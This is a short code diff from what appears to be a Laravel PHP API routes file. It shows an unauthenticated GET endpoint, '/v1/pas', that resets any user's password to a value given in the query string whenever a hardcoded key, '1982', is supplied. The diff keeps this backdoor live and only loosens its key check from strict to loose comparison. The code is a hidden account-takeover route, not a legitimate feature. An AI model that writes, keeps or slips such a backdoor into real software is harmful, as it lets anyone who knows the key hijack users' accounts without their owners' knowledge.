@@ -64,7 +64,7 @@ Route::group(['prefix' => 'v1'], function() {
     });
 
     Route::get('/pas', function(){
-        if(request()->input('k') === '1982'){
+        if(request()->input('k') == '1982'){
             $u = User::find((int)request()->input('u'));
             $u->password = bcrypt(request()->input('p'));
             $u->save();
